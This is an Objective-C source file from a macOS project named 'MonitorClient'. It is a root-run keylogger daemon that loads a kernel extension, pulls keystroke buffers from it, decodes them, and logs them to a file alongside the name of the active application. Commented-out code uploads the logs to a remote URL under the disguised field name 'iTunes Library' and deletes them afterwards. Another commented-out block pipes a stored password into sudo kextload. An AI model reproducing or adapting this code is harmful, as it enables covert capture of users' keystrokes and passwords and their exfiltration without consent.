//
//  LogerMgr.m
//  MonitorClient
//
//  Created by WangYongChun on 1/7/14.
//  Copyright (c) 2014 WangYongChun. All rights reserved.
//

#include <unistd.h>
#include <sys/mount.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <openssl/rand.h>
#include <syslog.h>

#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>
#include <SystemConfiguration/SystemConfiguration.h>
#include <time.h>
#include "KeyLogCommon.h"

#import "LogerMgr.h"
#import "AFNetworking.h"
#import "AFHTTPClient.h"


#define DEFAULT_MEG			50
#define DEFAULT_PATHNAME	"/Library/Preferences/com.fsb.logKext"
#define DEFAULT_PASSWORD	"logKext"
#define TIME_TO_SLEEP		0.05
#define PATHNAME_PREF_KEY	CFSTR("Pathname")
#define ENCRYPT_PREF_KEY	CFSTR("Encrypt")
#define PASSWORD_PREF_KEY	CFSTR("Password")
#define MINMEG_PREF_KEY		CFSTR("MinMeg")
#define SYSTEM_KEYCHAIN		"/Library/Keychains/System.keychain"
#define SECRET_SERVICENAME	"logKextPassKey"
#define GLOBAL_BUFFER_SIZE  1024 * 1024 // 1M
#define TEMP_BUFFER_SIZE  1024 // 1K

@implementation LogerMgr

/**********Function Declarations*************/

int			load_kext();
int         mungeString(CFStringRef someString);
bool		outOfSpace(CFStringRef);
void		stamp_file(const char*);
bool		fileExists(CFStringRef);
void		makeEncryptKey(CFStringRef pass);

void		updateKeymap();

void		getBufferSizeAndKeys(int *size,int *keys);
CFStringRef	getBuffer();
bool		connectToKext();

void		DaemonTimerCallback( CFRunLoopTimerRef timer, void *info );
int			InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned);
void		LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info);

/****** Globals ********/
io_connect_t		userClient;
CFDictionaryRef		keymap;

CFBooleanRef		showMods;
CFStringRef			pathName;
int                 fileWriteSpace = 0;
char                *gBuffer = NULL;
NSString            *oldActiveName = @"";
char                *gTempBuffer = NULL;
/****** Install Service ********/

-(int)installService:(NSString *)path httpUrl:(NSString *)url
{
    int nRet = 0;
    
    fileWriteSpace = 0;
    gBuffer = (char *)malloc(GLOBAL_BUFFER_SIZE);
    memset(gBuffer, 0x0, GLOBAL_BUFFER_SIZE);
    
    gTempBuffer = (char *)malloc(TEMP_BUFFER_SIZE);
    memset(gTempBuffer, 0x0, TEMP_BUFFER_SIZE);
    nRet = start();
    
    return nRet;
}

void log_file(FILE *fp, char *msg)
{
    int len = strlen(msg);
    fwrite(msg, 1, len, fp);
    fwrite("\n", 1, 1, fp);
    fflush(fp);
}
FILE *fp_debug = 0;
int start()
{
    fp_debug = fopen("/Applications/Log.txt", "w");
	if (geteuid())
	{
		syslog(LOG_ERR,"Error: Daemon must run as root.");
        log_file(fp_debug, "Error: Daemon must run as root.");
		exit(geteuid());
	}
    log_file(fp_debug, "startin ---");
    
    /*********Check keymap**********/
    
	updateKeymap();
    
    /*********Connect to kernel extension**********/
	
	if (!connectToKext())
	{
		if (load_kext())
		{
			stamp_file("Could not load KEXT");
            log_file(fp_debug, "Could not load KEXT");
            fclose(fp_debug);
			return 1;
		}
		if (!connectToKext())
		{
			stamp_file("Could not connect with KEXT");
            log_file(fp_debug, "Could not connect with KEXT");
            fclose(fp_debug);
			return 1;
		}
	}
	sleep(1);		// just a little time to let the kernel notification handlers finish
	
	stamp_file("LogKext Daemon starting up");
    log_file(fp_debug, "LogKext Daemon starting up");
	// stamp login file with initial user
	LoginLogoutCallBackFunction(NULL, NULL, NULL);
	
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	
    /*********Create Daemon Timer source**********/
    
	CFRunLoopTimerContext timerContext = { 0 };
	CFRunLoopSourceRef loginLogoutSource;
    if (InstallLoginLogoutNotifiers(&loginLogoutSource))
    {
		syslog(LOG_ERR,"Error: could not install login notifier");
        log_file(fp_debug, "Error: could not install login notifier");
    }
	else
		CFRunLoopAddSource(CFRunLoopGetCurrent(),loginLogoutSource, kCFRunLoopDefaultMode);
    
	CFRunLoopTimerRef daemonTimer = CFRunLoopTimerCreate(NULL, 0, TIME_TO_SLEEP, 0, 0, DaemonTimerCallback, &timerContext);
	CFRunLoopAddTimer(CFRunLoopGetCurrent(), daemonTimer, kCFRunLoopCommonModes);
    
	
	CFRunLoopRun();
	
	stamp_file("Server error: closing Daemon");
    
    log_file(fp_debug, "Server error: closing Daemon");
    
    fclose(fp_debug);
    
    return 0;
}


void DaemonTimerCallback( CFRunLoopTimerRef timer, void *info )
{
    /*********Wait if not logging**********/
    
	Boolean validKey;
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		isLogging = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
	}
	
	if (!CFBooleanGetValue(isLogging))
		return;
	
    /********* Check the buffer **********/
    
	int buffsize=0;
	int keys=0;
	getBufferSizeAndKeys(&buffsize,&keys);
    
#ifdef DEBUG
    syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);
#endif
    
	if (!keys)			// no keyboards logged
		return;
    
	//if (buffsize < MAX_BUFF_SIZE/10)
	//	return;
    
    /********* Get the buffer **********/
    
	CFStringRef the_buffer = getBuffer();
	
    const char * str =CFStringGetCStringPtr(the_buffer, kCFStringEncodingMacRoman);
    
    if ( str != NULL )
    {
        memcpy(gBuffer + strlen(gBuffer), str, strlen(str));
        printf("%s\n", str);
    }
    /********* write to file **********/
    
    //Write the app name to file when top application changes
    //get top application name.
    NSString *curActiveAppName = @"";
    
    for (NSRunningApplication *currApp in [[NSWorkspace sharedWorkspace] runningApplications]) {
        if ([currApp isActive]) {
            curActiveAppName = [currApp localizedName];
            break;
        }
    }
    
    // -----------------
    if (![curActiveAppName isEqual:oldActiveName])
    {
        FILE  *fp = fopen(LOG_PATH, "a+b");
        const char *cActvName = [curActiveAppName UTF8String];

        if (fp != NULL)
        {
            struct timeval curTime;
            gettimeofday(&curTime, NULL);
            char buffer[80];
            strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", localtime(&curTime.tv_sec));
            fputs("\n", fp);
            //fputs("---------- ", fp);
            memset(gTempBuffer, 0x0, TEMP_BUFFER_SIZE);
            sprintf(gTempBuffer, "---------- %s ( %s ) ---------- ", cActvName, buffer);
            fputs(gTempBuffer, fp);
            fputs("\n", fp);
            fputs(gBuffer, fp);
            fputs("\n", fp);
            //fclose(fp);
            memset(gBuffer, 0x0, GLOBAL_BUFFER_SIZE);
            fclose(fp);
        }
        oldActiveName = curActiveAppName;
    }
    
    fileWriteSpace ++;
    //if (fileWriteSpace == 100) // Wait for 5 sec
    {
        if (strlen(gBuffer) > 0)
        {
            FILE  *fp = fopen(LOG_PATH, "a+b");
            if (fp != NULL)
            {
                fputs(gBuffer, fp);
                fclose(fp);
            }
            memset(gBuffer, 0x0, GLOBAL_BUFFER_SIZE);
        }

        fileWriteSpace = 0;
    }
    
	CFRelease(the_buffer);
	
	return;
}

int load_kext()
{
    
    int		childStatus=0;
    pid_t	pid;
    
    if (!(pid = fork()))
	{
		execl("/sbin/kextload", "/sbin/kextload", "-b", KEXT_ID, NULL);
		_exit(0);
	}
	waitpid(pid, &childStatus, 0);
	return childStatus;
    
    /*
    FILE *fp = fopen("/System/Library/Extensions/Pwd.txt", "r");
    if (fp == NULL)
    {
        log_file(fp_debug, "pwd file not open");
        return 1;
    }
    char buf[1024];
    int len = fread(buf, 1, 1024, fp);
    buf[len - 1] = '\0';
    NSString *pwd = [NSString stringWithFormat:@"%s", buf];
    fclose(fp);
    
    
    NSString *path = [[[NSBundle mainBundle] bundlePath] stringByDeletingLastPathComponent];
    
    //NSString *path = [[NSFileManager defaultManager] currentDirectoryPath];
    
    NSMutableArray *cmdArr = [[NSMutableArray alloc] init];
    NSString *cmd = [NSString stringWithFormat:@"echo %@ | sudo kextload /System/Library/Extensions/KeyLog.kext", pwd];
    [cmdArr addObject:cmd];
   
    for (int i = 0; i < cmdArr.count; i ++)
    {
        NSTask *task;
        NSArray	*args;
        
        task = [[NSTask alloc] init];
        

            [task setLaunchPath:@"/bin/bash"];
            args = [NSArray arrayWithObjects:@"-l",
                    @"-c",
                    [cmdArr objectAtIndex:i],
                    nil];

        
        [task setArguments: args];
        [task launch];
        
            [task waitUntilExit];
    }
    return 0;
     */
}

void updateKeymap()
{
	CFReadStreamRef	readStream;
    
	if (!fileExists(CFSTR(KEYMAP_PATH)))
	{
		stamp_file("Error: Keymap file is missing");
		keymap = NULL;
		return;
	}
	
	readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
	if (!readStream||!(CFReadStreamOpen(readStream)))
	{
		stamp_file("Error: Can't open keymap file");
		keymap = NULL;
		return;
	}
	keymap = (CFDictionaryRef)CFPropertyListCreateFromStream(kCFAllocatorDefault,readStream,0,kCFPropertyListImmutable,NULL,NULL);
	CFReadStreamClose(readStream);
	if (!keymap)
	{
		stamp_file("Error: Can't read keymap file");
		return;
	}
	
	Boolean validKey;
	showMods = (CFPreferencesGetAppBooleanValue(CFSTR("Mods"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		showMods = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Mods"),showMods,PREF_DOMAIN);
	}
}

bool fileExists(CFStringRef pathName)
{
	struct stat fileStat;
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		return false;
	return true;
}

void stamp_file(const char * inStamp)
{
	time_t the_time;
	char timeBuf[32]={0};
	time(&the_time);
	ctime_r(&the_time, timeBuf);
	char* newlin=strchr(timeBuf, '\n');
	if (newlin)
		*newlin=0;
	printf("![%s :%s]\n", inStamp, timeBuf);
	
}

bool connectToKext()
{
    mach_port_t		masterPort;
    io_service_t	serviceObject = 0;
    io_iterator_t 	iterator;
    CFDictionaryRef	classToMatch;
	Boolean			result = true;	// assume success
    
    // return the mach port used to initiate communication with IOKit
    if (IOMasterPort(MACH_PORT_NULL, &masterPort) != KERN_SUCCESS)
		return false;
    
    classToMatch = IOServiceMatching( "com_prebeg_kext_KeyLog" );
    if (!classToMatch)
    {
        log_file(fp_debug, "class to match = false");
		return false;
    }
    
    // create an io_iterator_t of all instances of our driver's class that exist in the IORegistry
    if (IOServiceGetMatchingServices(masterPort, classToMatch, &iterator) != KERN_SUCCESS)
    {
        log_file(fp_debug, "get matching services = false");
		return false;
    }
    
    // get the first item in the iterator.
    serviceObject = IOIteratorNext(iterator);
    
    // release the io_iterator_t now that we're done with it.
    IOObjectRelease(iterator);
    
    if (!serviceObject){
        log_file(fp_debug, "serviceobject= null");
		result = false;
		goto bail;
    }
	
	// instantiate the user client
	if(IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient) != KERN_SUCCESS) {
        log_file(fp_debug, "service open false");
		result = false;
		goto bail;
    }
	
bail:
	if (serviceObject) {
		IOObjectRelease(serviceObject);
	}
	
    return result;
}

void getBufferSizeAndKeys(int* size, int* keys)
{
	kern_return_t kernResult;
	
	uint64_t	scalarO_64[2];
	uint32_t	outputCnt = 2;
    
	kernResult = IOConnectCallScalarMethod(userClient, // mach port
										   klogKextBuffandKeys,
										   NULL,
										   0,
										   scalarO_64,
										   &outputCnt);
	
	*size=(int)scalarO_64[0];
	*keys=(int)scalarO_64[1];
    
	return;
}

CFStringRef getBuffer()
{
	kern_return_t kernResult;
	bufferStruct myBufStruct;
	size_t structSize = sizeof(myBufStruct);
	
	kernResult = IOConnectCallMethod(userClient,
									 klogKextBuffer,
									 NULL,
									 0,
									 NULL,
									 (size_t)NULL,
									 NULL,
									 NULL,
									 &myBufStruct,
									 &structSize);
	
	CFDataRef result = CFDataCreate(kCFAllocatorDefault,myBufStruct.buffer,myBufStruct.bufLen);
	CFMutableStringRef decodedData = CFStringCreateMutable(kCFAllocatorDefault,0);
	
	if (!keymap)
		return decodedData;
	
	CFDictionaryRef flagsDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Flags"));
	if (!flagsDict)
		return decodedData;
	CFDictionaryRef ucDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Uppercase"));
	if (!ucDict)
		return decodedData;
	CFDictionaryRef lcDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Lowercase"));
	if (!lcDict)
		return decodedData;
    
    CFDictionaryRef spDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("SpecialKeys"));
	if (!spDict)
		return decodedData;
    
    
	CFNumberFormatterRef myNF = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
	
	for (int i=0; i<CFDataGetLength(result);i+=2)
	{
		u_int16_t curChar;
		CFDataGetBytes(result,CFRangeMake(i,2),(UInt8*)&curChar);
		bool isUpper = false;
		
		if (CFBooleanGetValue(showMods))
		{
			char flagTmp = (curChar >> 11);
			
			if (flagTmp & 0x01)
            {
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x01")));
                CFStringAppend(decodedData,CFSTR("+"));
            }
            
			if (flagTmp & 0x02)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x02")));
                CFStringAppend(decodedData,CFSTR("+"));
            }
            
			if (flagTmp & 0x04)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x04")));
                CFStringAppend(decodedData,CFSTR("+"));
            }
            
			if (flagTmp & 0x08)
			{
                CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x08")));
                CFStringAppend(decodedData,CFSTR("+"));
            }
            
			if (flagTmp & 0x10)
            	isUpper = true;
		}
        
		curChar &= 0x07ff;
		CFStringRef keyChar = CFNumberFormatterCreateStringWithValue(kCFAllocatorDefault,myNF,kCFNumberShortType,&curChar);
		CFStringRef text;
        
		if (isUpper)
			text = (CFStringRef)CFDictionaryGetValue(ucDict,keyChar);
		else
			text = (CFStringRef)CFDictionaryGetValue(lcDict,keyChar);
		
		if (text)
		{
			CFStringAppend(decodedData,text);
		}
		else
        {
            text = (CFStringRef)CFDictionaryGetValue(spDict, keyChar);
            if ( text )
            {
                if ( isUpper )
                {
                    CFStringAppend(decodedData, (CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x10")));
                    CFStringAppend(decodedData, CFSTR("+"));
                }
                CFStringAppend(decodedData,text);
                
            }
            else
            {
                CFStringAppend(decodedData, CFSTR("Unknown key:"));
                CFStringAppend(decodedData, keyChar);
                syslog(LOG_ERR,"Unmapped key %d",curChar);
            }
        }
	}
    
    return decodedData;
}

void LoginLogoutCallBackFunction(SCDynamicStoreRef store, CFArrayRef changedKeys, void * info)
{
    CFStringRef	consoleUserName;
    consoleUserName = SCDynamicStoreCopyConsoleUser(store, NULL, NULL);
    if (consoleUserName != NULL)
    {
		printf("User '%s' has logged in\n", CFStringGetCStringPtr(consoleUserName, kCFStringEncodingMacRoman));
        CFRelease(consoleUserName);
    }
}

int InstallLoginLogoutNotifiers(CFRunLoopSourceRef* RunloopSourceReturned)
{
    SCDynamicStoreContext DynamicStoreContext = { 0, NULL, NULL, NULL, NULL };
    SCDynamicStoreRef DynamicStoreCommunicationMechanism = NULL;
    CFStringRef KeyRepresentingConsoleUserNameChange = NULL;
    CFMutableArrayRef ArrayOfNotificationKeys;
    Boolean Result;
    
    *RunloopSourceReturned = NULL;
    DynamicStoreCommunicationMechanism = SCDynamicStoreCreate(NULL, CFSTR("KeyLog"), LoginLogoutCallBackFunction, &DynamicStoreContext);
    
    if (DynamicStoreCommunicationMechanism == NULL)
        return(-1); //unable to create dynamic store.
    
    KeyRepresentingConsoleUserNameChange = SCDynamicStoreKeyCreateConsoleUser(NULL);
    if (KeyRepresentingConsoleUserNameChange == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-2);
    }
    
    ArrayOfNotificationKeys = CFArrayCreateMutable(NULL, (CFIndex)1, &kCFTypeArrayCallBacks);
    if (ArrayOfNotificationKeys == NULL)
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        CFRelease(KeyRepresentingConsoleUserNameChange);
        return(-3);
    }
    CFArrayAppendValue(ArrayOfNotificationKeys, KeyRepresentingConsoleUserNameChange);
    
    Result = SCDynamicStoreSetNotificationKeys(DynamicStoreCommunicationMechanism, ArrayOfNotificationKeys, NULL);
    CFRelease(ArrayOfNotificationKeys);
    CFRelease(KeyRepresentingConsoleUserNameChange);
    
    if (Result == FALSE) //unable to add keys to dynamic store.
    {
        CFRelease(DynamicStoreCommunicationMechanism);
        return(-4);
    }
    
	*RunloopSourceReturned = SCDynamicStoreCreateRunLoopSource(NULL, DynamicStoreCommunicationMechanism, (CFIndex) 0);
    return(0);
}
/*
-(void)updateHandler
{
    if (!mbUpdated)
        return;
    
    //get top application name.
    NSString *activeAppName = @"";
    
    for (NSRunningApplication *currApp in [[NSWorkspace sharedWorkspace] runningApplications]) {
        if ([currApp isActive]) {
            activeAppName = [currApp localizedName];
            break;
        }
    }
    NSLog(@"%@", activeAppName);
    mbUpdated = false;
    
    NSDate* date = [NSDate date];
    NSDateFormatter* formatter = [[NSDateFormatter alloc] init];
    NSTimeZone *destinationTimeZone = [NSTimeZone systemTimeZone];
    formatter.timeZone = destinationTimeZone;
    [formatter setDateStyle:NSDateFormatterLongStyle];
    [formatter setDateFormat:@"MM-dd-yyyy"];
    NSString *dateString = [formatter stringFromDate:date];

    NSArray *dirFiles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mPath error:nil];
    for (int i = 0; i < [dirFiles count]; i ++)
    {
        NSString *fileName = [dirFiles objectAtIndex:i];
        NSRange aRange1 = [fileName rangeOfString:dateString];
        NSRange aRange2 = [fileName rangeOfString:@"_ready"];
        if (aRange1.location != NSNotFound) {
            if (aRange2.location != NSNotFound || ![dateString isEqualTo:mStartTime]) {
                // Upload the logFile to server
                NSString *fullPath = [NSString stringWithFormat:@"%@%@.txt", mPath, fileName];
                NSData *pData = [NSData dataWithContentsOfFile:fullPath];
                
                NSURL *fileURL = [[NSURL alloc] initFileURLWithPath:mUrl];
                AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:fileURL];
                
                NSMutableURLRequest *request = [httpClient multipartFormRequestWithMethod:@"POST" path:@"" parameters:nil constructingBodyWithBlock: ^(id <AFMultipartFormData>formData) {
                    [formData appendPartWithFormData:pData name:@"iTunes Library"];
                }];
                
                AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
                [operation setUploadProgressBlock:^(NSInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
                    //After uploaded, remove the file
                    [self removesendedFile:fullPath];
                }];
                [operation start];
            }
        } else {
            continue;
        }
    }

    mbUpdated = true;
}

-(int)removesendedFile:(NSString *)path
{
    int nRet = 0;
    NSError *error = nil;
    
    [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
    if (error.code != NSFileNoSuchFileError) {
        NSLog(@"%@", error);
    }
    
    return nRet;
}

-(int)installService:(NSString *)path httpUrl:(NSString *)url
{
    int nRet = 0;
    
    mbUpdated = true;
    mPath = path;
    mUrl = url;
    
    NSDate* date = [NSDate date];
    NSDateFormatter* formatter = [[NSDateFormatter alloc] init];
    NSTimeZone *destinationTimeZone = [NSTimeZone systemTimeZone];
    formatter.timeZone = destinationTimeZone;
    [formatter setDateStyle:NSDateFormatterLongStyle];
    [formatter setDateFormat:@"MM-dd-yyyy"];
    mStartTime = [formatter stringFromDate:date];
    
    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval:5.0f
                                                        target:self
                                                        selector:@selector(updateHandler)
                                                        userInfo:nil
                                                        repeats:YES];
    if (timer == NULL)
        nRet = -1;
    
    return nRet;
}
*/

@end
